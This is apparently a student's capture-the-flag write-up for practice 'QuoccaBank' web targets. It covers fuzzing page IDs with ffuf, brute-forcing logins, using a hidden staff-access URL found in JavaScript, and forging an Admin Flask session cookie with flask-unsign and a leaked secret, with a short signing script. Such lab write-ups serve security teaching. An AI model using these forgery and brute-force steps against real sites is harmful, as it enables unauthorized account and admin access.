## [Quocca Blog](https://blog.quoccabank.com/)

### IDOR

**Steps to flags**
1. Use `ffuf` to fuzz  https://blog.quoccabank.com/?p=FUZZ  

``` bash
  ffuf -u https://codingo.io/FUZZ -w ./wordlist.txt
```

3. Search bar on https://blog.quoccabank.com/?p=9 (for example)
4. Enter random character 'a' manually  (https://blog.quoccabank.com/?s=a)


###Authentication 
1. Brute forcing usernames and password (use ffuf or python script with SecLists)
2. Try admin, guest, password for username/password combinations


## [Quocca Files](https://files.quoccabank.com/#/)

**Steps to flags**
Authenticating correctly flags:
1. Registering as admin said username is taken 
2. Tried username = admin, pass = a (Got this clue from an earlier token)
3. Get two flags

Same flags via access control method:
1. Got new path `"/staff/wfh"` from JS source code (search on keyword path) 
2. Register with new user (u = rav, pass= rav)
3. Navigate to https://files.quoccabank.com/covid19/supersecret/lmao/grant_staff_access?username=rav which gives rav staff permissions and you can view the same flags as above method.

Flask key:
1. Decode the session token from https://files.quoccabank.com/covid19/supersecret/lmao/grant_staff_access?username=admin
```
flask-unsign --decode --cookie 'eyJyb2xlIjp7IiBiIjoiVTNSaFptWT0ifSwidXNlcm5hbWUiOiJyYXYifQ.YNhF1Q.bJXWI9je-z1Pz-k0CxN6NqGGfpA'
```
It gives `{'role': b'Staff', 'username': 'rav'}`

2. Change role: Admin and username: rav and generate a new flask session token with the secret from the flag (flask_cookie.py)
```python
import flask_unsign
import json

#Library - https://pypi.org/project/flask-unsign/

cookie_payload = '{"role": "Admin", "username": "rav"}'
secret= "$hallICompareTHEE2aSummersday" #This was in a file I found 
# need to convert the payload to a json object for the flask signing
payload_json = json.loads(cookie_payload)

print(flask_unsign.sign(value=payload_json, secret=secret))
```
3. Send this token when logged in to get the Admin access (+ flag)
